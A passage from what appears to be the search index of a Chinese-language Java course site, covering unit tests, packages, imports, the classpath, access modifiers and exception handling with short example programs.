\u662f\u6700\u7ec8\u7684\uff0c\u56e0\u4e3a\u5b83\u4eec\u6c38\u8fdc\u4e0d\u9700\u8981\u88ab\u4fee\u6539\u3002</li> <li><code>runAllTests()</code> \u662f\u62bd\u8c61\u7684\uff0c\u56e0\u4e3a\u5b83\u5fc5\u987b\u88ab\u91cd\u5199\u3002</li> </ul> <p>\u6211\u4eec\u6765\u6d4b\u8bd5\u4e00\u4e0b\u4e4b\u524d\u63d0\u5230\u7684 <code>Expression</code> \u7c7b\uff1a</p> <p>\u5355\u72ec\u5efa\u7acb\u4e00\u4e2a <code>ExpressionTest.java</code> </p> <pre><code>public class ExpressionTest extends SimpleUnitTest {\n    void testAddition() {\n        assertTrue(new Add(new Value(1), new Value(1)).evaluate() == 2);\n        assertTrue(new Add(new Value(1), new Value(2)).evaluate() == 3);\n        assertTrue(new Add(new Value(3), new Value(-3)).evaluate() == 0);\n    }\n\n    void testMultiplication() {\n        assertTrue(new Multiply(new Value(1), new Value(1)).evaluate() == 1);\n        assertTrue(new Multiply(new Value(1), new Value(2)).evaluate() == 2);\n        assertTrue(new Multiply(new Value(3), new Value(-3)).evaluate() == -9);\n    }\n\n    void testMixed() {\n        assertTrue(new Add(new Multiply(new Value(1), new Value(1)), new Multiply(new Value(1), new Value(2)))\n                .evaluate() == 3);\n        assertTrue(new Multiply(new Add(new Value(1), new Value(2)), new Add(new Value(3), new Value(4)))\n                .evaluate() == 21);\n    }\n\n    @Override\n    public void runAllTests() {\n        testAddition();\n        testMultiplication();\n        testMixed();\n    }\n\n    // \u6dfb\u52a0 main \u65b9\u6cd5\u4ee5\u4fbf\u76f4\u63a5\u8fd0\u884c\n    public static void main(String[] args) {\n        ExpressionTest tester = new ExpressionTest();\n        tester.runAllTests();\n    }\n}\n</code></pre> <pre><code>javac ExpressionTest.java SimpleUnitTest.java\njava ExpressionTest\n</code></pre>"},{"location":"cs/java/basics/w7/#packages","title":"Packages","text":"<p>\u8981\u662f\u597d\u591a\u7a0b\u5e8f\u5458\u5728\u4e00\u5757\u513f\u641e\u4e2a\u5927\u9879\u76ee\uff0c\u540d\u5b57\u649e\u8f66\u662f\u96be\u514d\u7684\u3002Java \u5141\u8bb8\u4e24\u4e2a\u7c7b\u6709\u4e0d\u540c\u7684\u540d\u5b57\uff0c\u53ea\u8981\u5b83\u4eec\u5728\u4e0d\u540c\u7684 namespace \u91cc\u5c31\u884c\u3002\u7528\u5305\u6765\u89e3\u51b3\u95ee\u9898\uff0c\u6211\u4eec\u53ef\u4ee5\u628a\u4e00\u4e9b\u76f8\u5173\u7684\u7c7b\u653e\u5728\u4e00\u8d77\uff0c\u5f04\u6210\u5305\u3002\u5230\u73b0\u5728\u4e3a\u6b62\uff0c\u54b1\u4eec\u4e00\u76f4\u7528\u7684\u5c31\u662f\u4e00\u4e2a\u5305\uff1a\u9ed8\u8ba4\u5305\u3002\u6bcf\u4e2a\u5305\u90fd\u662f\u4e00\u4e2a\u65b0\u547d\u540d\u7a7a\u95f4\u3002 </p> <ul> <li>\u5305\u57fa\u672c\u4e0a\u5c31\u662f\u4e00\u4e2a\u547d\u540d\u7a7a\u95f4\u91cc\u7684\u7c7b\u96c6\u5408\u3002</li> <li>\u5b83\u5c01\u88c5\u4e86\u4e00\u7ec4\u7c7b\u3002</li> <li>\u5c31\u50cf\u662f\u4e00\u4e2a\u5143\u7ea7\u522b\u7684\u7c7b\u3002</li> </ul> <p>\u8981\u628a\u4e00\u4e2a\u7c7b\u653e\u5728\u4e00\u4e2a\u5305\u91cc\uff0c\u4f60\u5f97\u505a\u4e24\u4ef6\u4e8b\u513f\uff1a</p> <p>\u7b2c\u4e00\uff0c\u5728 <code>.java</code> \u6587\u4ef6\u9876\u90e8\u5199\u4e0a\u5305\u540d <code>pkgname;</code></p> <p>\u7b2c\u4e8c\uff0c\u628a\u7c7b\u653e\u5728\u4e00\u4e2a\u548c\u5305\u540d\u4e00\u6837\u7684\u6587\u4ef6\u5939\u91cc\uff1a<code>/path/to/project/pkgname/</code></p> <pre><code>package pkga;\n\npublic class MyClass {\n    public static void main(String[] args) {\n        System.out.println(\"MyClass\");\n    }\n}\n</code></pre> <p>\u5047\u8bbe\u4f60\u5df2\u7ecf\u5728\u4f60\u60f3\u5b58\u653e\u9879\u76ee\u7684\u76ee\u5f55\u91cc\uff1a\u6bd4\u5982\uff0c<code>Lecture13/</code> \u8fd9\u4e2a\u76ee\u5f55\uff09</p> <ul> <li>\u6211\u4eec\u53ef\u4ee5\u901a\u8fc7 <code>javac Lecture13/MyClass.java</code> \u6765\u7f16\u8bd1 <code>MyClass</code></li> <li>\u6211\u4eec\u53ef\u4ee5\u901a\u8fc7 <code>java Lecture13.MyClass</code> \u6765\u8fd0\u884c\u5b83</li> <li>\u6211\u4eec\u7528\u70b9\u6765\u8bbf\u95ee\u5305\u91cc\u9762\u7684\u7c7b</li> </ul> <p>\u5982\u679c\u6211\u4eec\u5fd8\u4e86\u5199\u5305\u540d\uff0c\u5c31\u4f1a\u51fa\u9519\u4e86\u3002 \u4e00\u822c\u6765\u8bf4\uff0c\u76ee\u5f55\u540d\u548c\u5305\u540d\u5f97\u5bf9\u5f97\u4e0a</p> <p>Java \u4f1a\u53bb\u5bf9\u5e94\u7684\u76ee\u5f55\u91cc\u627e\u5305\uff0c\u5982\u679c\u4f60\u7684\u7c7b\u4e0d\u5728\u90a3\u91cc\uff0c\u7a0b\u5e8f\u5c31\u4f1a\u5d29\u6e83\u4e86\u3002</p> <p>\u5982\u679c\u9879\u76ee\u6709\u591a\u5c42\u6587\u4ef6\u5939\u4e5f\u53ef\u4ee5\u7ee7\u7eed\u91cd\u53e0\u4f7f\u7528\uff1a</p> <pre><code>package pkgb.subpackage1;\n\npublic class MyClass {\n    public static void main(String[] args) {\n        System.out.println(\"MyClass #2\");\n    }\n}\n</code></pre>"},{"location":"cs/java/basics/w7/#import","title":"<code>import</code>","text":"<p>\u5b9e\u4e60\u5199\u4ee3\u7801\u8fc7\u7a0b\u4e2d Java \u81ea\u52a8\u5bfb\u627e\u540c\u76ee\u5f55\u4ee3\u7801\uff0c\u5b50\u76ee\u5f55\u4ee3\u7801\u9700\u8981 <code>import</code>\uff0c<code>import</code> \u522b\u7684\u8def\u5f84\u7684\u5305\u4e5f\u53ef\u4ee5\u4f7f\u7528 <code>.</code> \u8bed\u6cd5</p> <pre><code>import pkg.subpkg.etc;\n</code></pre> <p>\u73b0\u5728\u4e3e\u4f8b\uff1a</p> <pre><code>Lecture13/\nLecture13/other directories...\nLecture13/vehicles/\nLecture13/vehicles/Bicycle.java\nLecture13/vehicles/Car.java\n</code></pre> <pre><code>import vehicles.Bicycle;\nimport vehicles.Car;\n</code></pre> <p>\u5982\u679c\u60f3\u76f4\u63a5\u4e00\u6b21\u6027\u5012\u5165\u5b8c\u6210\uff1a</p> <pre><code>import vehicles.*\n</code></pre> <p>\u6709\u65f6\u5019\u53ef\u80fd\u9700\u8981\u7ec4\u5408\uff1a</p> <pre><code>package pkgc;\nimport vehicles.*;\n</code></pre> <p>\u628a\u4ee3\u7801\u653e\u5230 <code>pkgc</code> \u76ee\u5f55\u91cc\u5e76\u4e0d\u4f1a\u6539\u53d8 <code>import</code> \u6587\u4ef6</p> <ul> <li><code>import</code> \u540e\u9762\u5199\u7684\u5305\u540d\u662f\u76f8\u5bf9\u4e8e\u6574\u4e2a\u9879\u76ee\u73af\u5883\u7684\u201c\u7edd\u5bf9\u201d\u540d\u79f0\uff0c\u4e0d\u662f\u76f8\u5bf9\u4e8e\u4f60\u5f53\u524d\u6240\u5728\u7684\u5305<code>pkgc</code> \u7684\u201c\u76f8\u5bf9\u201d\u4f4d\u7f6e\u3002\u4e0d\u80fd\u5199\u6210 <code>import ../vehicles.*;</code></li> </ul> <ul> <li><code>import</code> \u8bed\u53e5\u544a\u8bc9 Java \u7f16\u8bd1\u5668\u548c\u8fd0\u884c\u65f6\uff08JVM\uff09\uff1a\u201c\u6211\u9700\u8981\u7528\u5230\u540d\u4e3a <code>vehicles</code> \u7684\u8fd9\u4e2a\u5305\u3002\u81f3\u4e8e\u8fd9\u4e2a\u540d\u4e3a <code>vehicles</code> \u7684\u5305\u5177\u4f53\u5728\u78c1\u76d8\u4e0a\u7684\u54ea\u4e2a\u4f4d\u7f6e\uff0c\u662f\u7531\u4f60\u542f\u52a8\u7a0b\u5e8f\u7684\u65b9\u5f0f\u548c\u7c7b\u8def\u5f84\uff08Classpath\uff09\u8bbe\u7f6e\u6765\u51b3\u5b9a\u7684\u3002</li> <li>\u4f60\u5e94\u8be5\u7ad9\u5728\u4f60\u9879\u76ee\u7684\u6700\u9876\u5c42\u76ee\u5f55\u6765\u6267\u884c <code>java</code> \u547d\u4ee4\u3002Java \u9ed8\u8ba4\u4f1a\u4ece\u4f60\u6267\u884c <code>java</code> \u547d\u4ee4\u7684\u90a3\u4e2a\u76ee\u5f55\u5f00\u59cb\uff0c\u6839\u636e\u4f60\u63d0\u4f9b\u7684\u201c\u5305\u540d.\u7c7b\u540d\u201d\uff08\u5982 <code>pkgc.VehicleExample</code>\uff09\u6765\u67e5\u627e\u5bf9\u5e94\u7684 <code>.class</code> \u6587\u4ef6\uff08\u67e5\u627e <code>pkgc</code> \u6587\u4ef6\u5939\u4e0b\u7684 <code>VehicleExample.class</code>\uff09\uff0c\u5b83\u4e0d\u4f1a\u81ea\u52a8\u5f80\u4e0a\u5c42\u76ee\u5f55\u67e5\u627e</li> </ul> <pre><code>.\n\u251c\u2500\u2500 pkgA\n\u2502   \u251c\u2500\u2500 Provider.class\n\u2502   \u2514\u2500\u2500 Provider.java\n\u2514\u2500\u2500 pkgB\n    \u251c\u2500\u2500 Consumer.class\n    \u2514\u2500\u2500 Consumer.java\n</code></pre> <pre><code>package pkgB; // Declares this class belongs to the 'pkgB' package\n\n// Import statement uses the 'absolute' package name 'pkgA'\n// It doesn't matter that Consumer.java is in pkgB.\n// We are telling Java: \"Find the package named 'pkgA' relative to the classpath root\".\nimport pkgA.Provider;\n\n// Trying something like 'import ../pkgA.Provider;' would be a compile-time error.\n// Java imports are not relative file paths.\n\npublic class Consumer {\n    public static void main(String[] args) {\n        System.out.println(\"Consumer starting in pkgB...\");\n        Provider myProvider = new Provider(); // Create an instance of the imported class\n        myProvider.offerService(); // Use the imported class\n        System.out.println(\"Consumer finishing in pkgB.\");\n    }\n}\n</code></pre> <pre><code>package pkgA; // Declares this class belongs to the 'pkgA' package\n\npublic class Provider {\n    public void offerService() {\n        System.out.println(\"  -&gt; Service offered by Provider in pkgA!\");\n    }\n}\n</code></pre> <pre><code>javac pkgB/Consumer.java\njava pkgB/Consumer\n</code></pre> <p>\u867d\u7136\u73b0\u4ee3\u7f16\u8bd1\u5668\u81ea\u52a8\u5b8c\u6210\u4e86\u8fd9\u4e9b\u4e8b</p>"},{"location":"cs/java/basics/w7/#the-classpath","title":"The Classpath","text":"<ul> <li>\u6211\u4eec\u8fd0\u884c <code>Java</code> \u7a0b\u5e8f\u7684\u65f6\u5019\uff0c\u5b83\u4f1a\u627e\u90a3\u4e9b\u653e\u5728\u5b50\u76ee\u5f55\u91cc\u7684\u5305</li> <li>\u6bcf\u6b21 <code>Java</code> \u770b\u5230 <code>import</code> \u8bed\u53e5\uff0c\u5b83\u5c31\u4f1a\u4ece\u5f53\u524d\u76ee\u5f55\u5f00\u59cb\uff0c\u5f80\u5bf9\u5e94\u7684\u5b50\u76ee\u5f55\u91cc\u627e</li> <li>\u4f60\u8fd8\u53ef\u4ee5\u544a\u8bc9 <code>Java</code> \u53bb\u5176\u4ed6\u5730\u65b9\u627e\u5305</li> <li>\u5b83\u4f1a\u68c0\u67e5\u5728 <code>classpath</code> \u91cc\u6307\u5b9a\u7684\u6240\u6709\u76ee\u5f55</li> <li>\u4f60\u53ef\u4ee5\u4fee\u6539 <code>classpath</code></li> </ul>"},{"location":"cs/java/basics/w7/#java-api","title":"Java API","text":"<p>\u9ed8\u8ba4\u60c5\u51b5\u4e0b <code>classpath</code>\u81ea\u52a8\u641c\u7d22\u5305\u542b\u5f53\u524d\u8def\u5f84\uff0c\u4e5f\u4f1a\u641c\u7d22 Java API </p> <pre><code>import java.util.Scanner;\n</code></pre> <p>https://docs.oracle.com/en/java/javase/11/docs/api/java.base/module-summary.html</p> <p><code>java.lang</code> \u5305\u91cc\u5934\u6709 <code>String</code> \u548c <code>Object</code> \u8fd9\u6837\u7684\u7c7b\u88ab\u9ed8\u8ba4\u5bfc\u5165\uff0c\u548c\u9ed8\u8ba4\u5305\u91cc\u7684\u6240\u6709\u4e1c\u897f\u4e00\u8d77\u81ea\u52a8\u5bfc\u5165\u3002</p>"},{"location":"cs/java/basics/w7/#adding-to-the-classpath","title":"Adding to the Classpath","text":"<p>\u5982\u679c\u6211\u4eec\u60f3\u6539\u6362\u7c7b\u8def\u5f84\uff0c\u53ef\u4ee5\u7528\u8fd9\u4e2a <code>--class-path</code> \u6807\u5fd7</p> <ul> <li>\u53ef\u4ee5\u7528\u5192\u53f7 <code>:</code> \u5206\u9694\u6765\u6307\u5b9a\u591a\u4e2a\u76ee\u5f55</li> <li><code>javac --class-path=path/to/package:path/to/other/package</code>.</li> <li><code>java --class-path=path/to/package:path/to/other/package</code></li> <li>\u5728 Windows \u7cfb\u7edf\u91cc\uff0c\u76ee\u5f55\u8def\u5f84\u8981\u7528\u53cd\u659c\u6760</li> <li>\u522b\u5fd8\u4e86\u628a\u5f53\u524d\u76ee\u5f55\u4e5f\u52a0\u4e0a\uff0c<code>--class-path=some/path:.</code></li> <li>\u901a\u5e38 IDE \u4f1a\u5e2e\u4f60\u5904\u7406\u8fd9\u4e2a\uff0c\u4f60\u4e5f\u53ef\u4ee5\u7528\u540c\u6837\u7684\u65b9\u6cd5\u4fee\u6539 <code>CLASSPATH</code> \u73af\u5883\u53d8\u91cf</li> </ul> <p>\u6bd4\u5982\u4e3a\u4e86\u6267\u884c\u4e00\u4e2a\u4f9d\u8d56\u4e24\u4e2a\u4e0d\u540c\u76ee\u5f55\u7684\u6587\u4ef6</p> <pre><code>.\n\u251c\u2500\u2500 Lecture13\n\u2502\u00a0\u00a0 \u251c\u2500\u2500 ClasspathExample.java\n\u2502\u00a0\u00a0 \u251c\u2500\u2500 pkga\n\u2502\u00a0\u00a0 \u2502\u00a0\u00a0 \u251c\u2500\u2500 MyClass.java\n\u2502\u00a0\u00a0 \u2502\u00a0\u00a0 \u2514\u2500\u2500 NoPackage.java\n\u2502\u00a0\u00a0 \u251c\u2500\u2500 pkgb\n\u2502\u00a0\u00a0 \u2502\u00a0\u00a0 \u251c\u2500\u2500 subpackage1\n\u2502\u00a0\u00a0 \u2502\u00a0\u00a0 \u2502\u00a0\u00a0 \u2514\u2500\u2500 MyClass.java\n\u2502\u00a0\u00a0 \u2502\u00a0\u00a0 \u2514\u2500\u2500 subpackage2\n\u2502\u00a0\u00a0 \u2502\u00a0\u00a0     \u2514\u2500\u2500 MyClass.java\n\u2502\u00a0\u00a0 \u251c\u2500\u2500 pkgc\n\u2502\u00a0\u00a0 \u2502\u00a0\u00a0 \u2514\u2500\u2500 VehicleExample.java\n\u2502\u00a0\u00a0 \u251c\u2500\u2500 VehicleExample.java\n\u2502\u00a0\u00a0 \u2514\u2500\u2500 vehicles\n\u2502\u00a0\u00a0     \u251c\u2500\u2500 Bicycle.java\n\u2502\u00a0\u00a0     \u251c\u2500\u2500 Boat.java\n\u2502\u00a0\u00a0     \u251c\u2500\u2500 Car.java\n\u2502\u00a0\u00a0     \u251c\u2500\u2500 extra_vehicles\n\u2502\u00a0\u00a0     \u2502\u00a0\u00a0 \u2514\u2500\u2500 Kayak.java\n\u2502\u00a0\u00a0     \u2514\u2500\u2500 MotorBoat.java\n\u2514\u2500\u2500 Lecture13_Extra\n    \u2514\u2500\u2500 pkgd\n        \u2514\u2500\u2500 Greeter.java\n</code></pre> <pre><code>javac --class-path=../Lecture13 Extra/:. ClasspathExample.java\njava --class-path=../Lecture13 Extra/:. ClasspathExample\n</code></pre> <p>\u5728 Lecture13 \u6587\u4ef6\u5939\u4e2d\uff0c\u90a3\u4e48\u8fd9\u6837\u5bfb\u627e\u81ea\u5df1\u5f53\u524d\u76ee\u5f55\u4e0b\u5b50\u5305\u7684\u540c\u65f6\u8fd8\u6db5\u76d6\u4e86\u53e6\u5916\u4e00\u4e2a\u6587\u4ef6\u5939\u7684</p> <p>\u53e6\u5916\u5305\u53ef\u4ee5\u88ab\u7f16\u8f91\u4e3a <code>.jar</code> \u6587\u4ef6\uff0c\u4e5f\u5c31\u662f Java Archive</p> <p>https://docs.oracle.com/javase/tutorial/deployment/jar/basicsindex.html</p> <p>\u4e00\u6837\u53ef\u4ee5\u88ab\u6dfb\u52a0\u8fdb <code>classpath</code></p> <pre><code>javac --class-path=path/to/mypackage.jar\n</code></pre>"},{"location":"cs/java/basics/w7/#packages-and-access-modifiers","title":"Packages and Access Modifiers","text":"<p>\u4efb\u4f55\u5b50\u7c7b\u90fd\u53ef\u4ee5\u8bbf\u95ee\u53d7\u4fdd\u62a4\u7684\u6210\u5458\uff0c\u5373\u4f7f\u8fd9\u4e2a\u5b50\u7c7b\u5728\u53e6\u4e00\u4e2a\u5305\u91cc\u3002</p> <p>\u5982\u679c\u4f60\u60f3\u8ba9\u4eba\u5bb6\u80fd\u6269\u5c55\u4f60\u7684\u7c7b\u5e76\u4e14\u4f7f\u7528\u91cc\u9762\u7684\u6210\u5458\uff0c\u5c31\u628a\u5b83\u8bbe\u7f6e\u4e3a\u53d7\u4fdd\u62a4\u7684\uff0c\u5426\u5219\u5c31\u8bbe\u7f6e\u6210\u9ed8\u8ba4</p>"},{"location":"cs/java/basics/w8/","title":"8.0 Exceptions, Interfaces","text":""},{"location":"cs/java/basics/w8/#exceptions","title":"Exceptions","text":"<p>\u62fc\u5199\u9519\u8bef\u7684\u53d8\u91cf\u540d\uff0c\u8bbf\u95ee\u6570\u7ec4\u8d8a\u754c <code>java.lang.ArrayIndexOutOfBoundsException</code></p> <p>\u7a0b\u5e8f\u4f1a \u201c\u629b\u51fa\u201d \u4e00\u4e2a\u5f02\u5e38\uff0c\u6211\u4eec\u53ef\u4ee5\u201c\u6355\u83b7\u201d\u8fd9\u4e2a\u5f02\u5e38\u5e76\u5904\u7406\u5b83\uff0c\u9632\u6b62\u7a0b\u5e8f\u5d29\u6e83</p>"},{"location":"cs/java/basics/w8/#try-catch","title":"Try Catch","text":"<pre><code>import java.util.Scanner;\n\npublic class ArrayTryCatch {\n    public static void main(String[] args) {\n        int[] a = { 882, 2, 11 };\n        Scanner sc = new Scanner(System.in);\n        System.out.print(\"Enter index: \");\n        int index = sc.nextInt();\n        try {\n            System.out.println(a[index]);\n        } catch (ArrayIndexOutOfBoundsException e) {\n            System.out.println(\"Caught ArrayIndexOutOfBoundsException\");\n        }\n    }\n}\n</code></pre> <pre><code>try {\n// some code\n} catch (ExceptionType exception) {\n// handle the exception\n}\n</code></pre> <p>\u53ea\u8981\u6293\u4f4f\u6570\u7ec4\u8d8a\u754c\u8fd9\u4e2a\u9519\u8bef\u7c7b\u578b\uff0c\u90a3\u4e48\u5c31\u6253\u5370\u9519\u8bef\u5230\u5c4f\u5e55</p> <ul> <li>\u4ee3\u7801\u7b2c\u516b\u884c\u53ef\u4ee5\u770b\u5230\u9700\u8981\u8f93\u5165\u7684\u662f\u4e00\u4e2a\u6574\u6570\uff0c\u90a3\u4e48\u53ef\u80fd\u6293\u4e0d\u5230 <code>InputMismatchException</code> \u7c7b\u578b\u7684\u9519\u8bef\uff0c\u5bfc\u81f4\u7a0b\u5e8f\u5d29\u6e83</li> </ul> <pre><code>import java.util.Scanner;\n\nimport java.util.InputMismatchException;\n\npublic class ArrayTryCatch2 {\n    public static void main(String[] args) {\n        int[] a = { 882, 2, 11 };\n        Scanner sc = new Scanner(System.in);\n        System.out.print(\"Enter index: \");\n        try {\n            int index = sc.nextInt();\n            System.out.println(a[index]);\n        } catch (ArrayIndexOutOfBoundsException e) {\n            System.out.println(\"Caught ArrayIndexOutOfBoundsException\");\n        } catch (InputMismatchException e) {\n            System.out.println(\"Please enter a valid integer next time\");\n        }\n    }\n}\n</code></pre> <p>\u56e0\u6b64\u53ef\u4ee5\u5199\u591a\u4e2a catch \u6355\u6349</p>"},{"location":"cs/java/basics/w8/#exception-control-flow","title":"Exception Control Flow","text":"<pre><code>public class Example {\n\n    // \u5de5\u4eba B \u7684\u5de5\u4f5c\uff1a\u5c1d\u8bd5\u505a\u9664\u6cd5\n    public static void workerB(int x) {\n        System.out.println(\"Worker B starts working...\");\n        int result = 10 / x; // &lt;--- \u8fd9\u91cc\u53ef\u80fd\u4f1a\u51fa\u95ee\u9898\uff01\n        System.out.println(\"Worker B calculated result: \" + result);\n        System.out.println(\"Worker B finished working.\");\n    }\n\n    // \u5de5\u5934 A \u7684\u5de5\u4f5c\uff1a\u8ba9\u5de5\u4eba B \u53bb\u5de5\u4f5c\n    public static void workerA() {\n        System.out.println(\"Worker A starts supervising...\");\n        workerB(0); // &lt;--- \u8ba9 workerB \u53bb\u505a\u9664\u4ee5 0 \u7684\u8ba1\u7b97\n        System.out.println(\"Worker A finished supervising.\");\n    }\n\n    // \u8001\u677f main \u7684\u5de5\u4f5c\uff1a\u8ba9\u5de5\u5934 A \u53bb\u76d1\u7763\n    public static void main(String[] args) {\n        System.out.println(\"Main starts the project...\");\n        workerA();\n        System.out.println(\"Main finished the project.\");\n    }\n}\n</code></pre> <ul> <li>\u7cfb\u7edf\u53d1\u73b0\u8fd9\u4e2a <code>ArithmeticException</code> \u7684\u5f02\u5e38\u5bf9\u8c61\u629b\u51fa</li> <li><code>workerB</code> \u5728\u51fa\u9519\u7684\u90a3\u4e00\u884c\u7acb\u523b\u505c\u6b62\u6267\u884c\u3002<code>System.out.println(\"Worker B calculated result: \" + result);</code> \u8fd9\u4e00\u884c\u53ca\u4e4b\u540e\u7684\u4ee3\u7801\u4e0d\u4f1a**\u88ab\u6267\u884c\u3002</li> </ul> <ul> <li>\u5728 <code>workerB</code> \u65b9\u6cd5\u5185\u90e8\uff0c\u51fa\u9519\u7684\u8fd9\u884c\u4ee3\u7801 <code>int result = 10 / x;</code> \u6ca1\u6709\u88ab\u653e\u5728 <code>try...catch</code> \u5757\u91cc\u3002\u6240\u4ee5\uff0c<code>workerB</code> \u65b9\u6cd5\u65e0\u6cd5\u5904\u7406\u8fd9\u4e2a\u5f02\u5e38\uff0c\u5b83\u7acb\u5373\u7ec8\u6b62\u4e86\u3002</li> </ul> <ul> <li>\u5f02\u5e38\u5411\u4e0a\u4f20\u9012\uff0c\u4f20\u9012\u7ed9 14 \u884c\u53d1\u73b0\u4e5f\u6ca1\u6709 <code>try catch</code> \u5757\u5f02\u5e38\u5904\u7406\u4e5f\u7acb\u5373\u7ec8\u6b62\uff0c\u5f02\u5e38\u7ee7\u7eed\u5411\u4e0a\u4f20\u9012\uff0c\u4f20\u7ed9\u8c03\u7528 <code>WorkA</code> \u7684\u65b9\u6cd5\u4e5f\u5c31\u662f <code>main</code> \u6700\u540e\u53d1\u73b0\u8fd8\u662f\u6ca1\u6709\u5f02\u5e38\u5904\u7406\u5757\uff0c\u56e0\u6b64\u8fd9\u4e9b\u6253\u5370\u8bed\u53e5\u5747\u4e0d\u4f1a\u88ab\u6267\u884c\u90fd\u7acb\u5373\u7ec8\u6b62\u4e86\uff0cJVM \u4f1a\u7ec8\u6b62\u6574\u4e2a\u7a0b\u5e8f\u7684\u8fd0\u884c</li> </ul> <p>\u60f3\u8981\u89e3\u51b3\u8fd9\u4e2a\u95ee\u9898\u5728 A \u5904\u6dfb\u52a0\u5f02\u5e38\u5904\u7406\u5373\u53ef</p> <pre><code>public class ExampleFixed {\n\n    public static void workerB(int x) {\n        System.out.println(\"Worker B starts working...\");\n        // \u8fd9\u884c\u4ecd\u7136\u53ef\u80fd\u629b\u51fa ArithmeticException\n        int result = 10 / x;\n        System.out.println(\"Worker B calculated result: \" + result);\n        System.out.println(\"Worker B finished working.\");\n    }\n\n    public static void workerA() {\n        System.out.println(\"Worker A starts supervising...\");\n        try {\n            // \u628a\u53ef\u80fd\u51fa\u9519\u7684\u8c03\u7528\u653e\u8fdb try \u5757\n            workerB(0);\n        } catch (ArithmeticException e) {\n            // \u5982\u679c workerB \u629b\u51fa\u4e86 ArithmeticException\uff0c\u8fd9\u91cc\u4f1a\u6355\u83b7\u5b83\n            System.out.println(\"Worker A caught an issue: \" + e.getMessage());\n        }\n        // \u56e0\u4e3a\u5f02\u5e38\u88ab catch \u5904\u7406\u4e86\uff0c\u7a0b\u5e8f\u4f1a\u7ee7\u7eed\u6267\u884c catch \u540e\u9762\u7684\u4ee3\u7801\n        System.out.println(\"Worker A finished supervising.\");\n    }\n\n    public static void main(String[] args) {\n        System.out.println(\"Main starts the project...\");\n        workerA(); // \u8c03\u7528 workerA\n        System.out.println(\"Main finished the project.\"); // \u8fd9\u884c\u73b0\u5728\u4f1a\u88ab\u6267\u884c\u4e86\uff01\n    }\n}\n</code></pre>"},{"location":"cs/java/basics/w8/#exceptions-and-inheritance","title":"Exceptions and Inheritance","text":"<p>\u6211\u4eec\u9700\u8981\u53bb\u51b3\u5b9a\u6293\u4f4f\u9519\u8bef\u540e\u9700\u8981\u5e72\u4e9b\u4ec0\u4e48\uff0c\u6709\u65f6\u5019\u6253\u5370\u5c31\u591f\u4e86\uff0c\u6709\u65f6\u5019\u9700\u8981\u8981\u6c42\u91cd\u8f93\u5165\u7b49</p> <p>\u53e6\u5916\u5f02\u5e38\u4e5f\u50cf \u201c\u5bb6\u65cf\u201d \u4e00\u6837\u6709\u7ee7\u627f\u5173\u7cfb</p> <p>\u6709\u4e00\u4e2a\u6700\u8001\u7684\u7956\u5148\uff0c\u53eb\u505a <code>Throwable</code> (\u4ee3\u8868\u6240\u6709\u80fd\u88ab\u629b\u51fa\u7684\u95ee\u9898)\u3002\u5176\u6709\u4e24\u4e2a\u5206\u652f</p> <ul> <li><code>Error</code> <ul> <li>\u901a\u5e38\u662f JVM \u5185\u90e8\u9519\u8bef\u6216\u8d44\u6e90\u8017\u5c3d\u7b49\u4e25\u91cd\u95ee\u9898\uff0c\u7a0b\u5e8f\u4e00\u822c\u6ca1\u6cd5\u5904\u7406\uff0c\u6bd4\u5982\u5185\u5b58\u6ea2\u51fa <code>OutOfMemoryError</code>\u3002\u6211\u4eec\u901a\u5e38\u4e0d <code>catch</code> \u8fd9\u4e2a</li> </ul> </li> <li><code>Exception</code> \u4e0b\u9762\u53c8\u6709\u597d\u591a\u5206\u652f\uff08\u5b50\u7c7b\uff09\uff0c\u628a\u95ee\u9898\u5206\u7c7b\uff1a<ul> <li><code>IOException</code></li> <li><code>RuntimeException</code></li> </ul> </li> </ul> <p>\u56e0\u6b64 <code>catch (ExceptionType e)</code> \u4e0d\u4ec5\u80fd\u6355\u83b7\u6b63\u597d\u662f <code>ExceptionType</code> \u7c7b\u578b\u7684\u5f02\u5e38\uff0c\u8fd8\u80fd\u6355\u83b7\u6240\u6709 <code>ExceptionType</code> \u7684\u5b50\u7c7b\uff08\u6216\u5b59\u5b50\u7c7b\u7b49\u540e\u4ee3\uff09\u7c7b\u578b\u7684\u5f02\u5e38\u3002</p> <ul> <li><code>catch (FileNotFoundException e)</code>\uff1a\u8fd9\u662f\u4e00\u4e2a\u5c0f\u7f51\u773c\u7684\u7f51\uff0c\u4e13\u95e8\u7528\u6765\u6355\u635e\u201c\u6587\u4ef6\u627e\u4e0d\u5230\u201d\u8fd9\u79cd\u5177\u4f53\u7684\u9c7c\u3002</li> <li><code>catch (IOException e)</code>\uff1a\u8fd9\u662f\u4e00\u4e2a\u4e2d\u7b49\u7f51\u773c\u7684\u7f51\uff0c\u5b83\u53ef\u4ee5\u6355\u635e\u201c\u6587\u4ef6\u627e\u4e0d\u5230\u201d(<code>FileNotFoundException</code>) \u8fd9\u6761\u9c7c\uff0c\u4e5f\u80fd\u6355\u635e\u5176\u4ed6\u5404\u79cd I/O \u76f8\u5173\u7684\u9c7c\uff08\u6bd4\u5982 <code>SocketException</code>\uff09\uff0c\u56e0\u4e3a\u5b83\u4eec\u90fd\u5c5e\u4e8e\u201cIO\u9c7c\u201d\u8fd9\u4e2a\u5927\u7c7b\u3002</li> <li><code>catch (Exception e)</code>\uff1a\u8fd9\u662f\u4e00\u4e2a\u975e\u5e38\u5927\u7684\u7f51\uff0c\u51e0\u4e4e\u53ef\u4ee5\u6355\u635e\u6240\u6709\u7a0b\u5e8f\u8fd0\u884c\u65f6\u53ef\u80fd\u9047\u5230\u7684\u3001\u53ef\u5904\u7406\u7684\u9c7c\uff08<code>IOException</code>, <code>RuntimeException</code> \u53ca\u5176\u6240\u6709\u5b50\u5b59\u540e\u4ee3\uff09\u3002</li> </ul> <p><code>catch</code> \u5757\u5229\u7528\u4e86\u7ee7\u627f\u7684\u591a\u6001\u6027\uff0c\u65e2\u53ef\u4ee5\u7cbe\u786e\u6355\u83b7\u7279\u5b9a\u7c7b\u578b\u7684\u9519\u8bef\uff0c\u4e5f\u53ef\u4ee5\u7528\u4e00\u4e2a <code>catch</code> \u5757\u5904\u7406\u4e00\u7c7b\u76f8\u5173\u7684\u9519\u8bef\u3002</p>"},{"location":"cs/java/basics/w8/#throw","title":"<code>throw()</code>","text":"<p>\u6211\u4eec\u4f7f\u7528 <code>StringStack</code> \u6f14\u793a\uff0c<code>stack</code> \u662f\u6700\u5c0f\u7684\u6570\u636e\u7ed3\u6784 FILO</p> <pre><code>public class StringStack {\n    private String[] data;\n    private int top;\n\n    public StringStack(int capacity) { ... }\n    public void push(String s) { ... }\n    public String pop() { ... 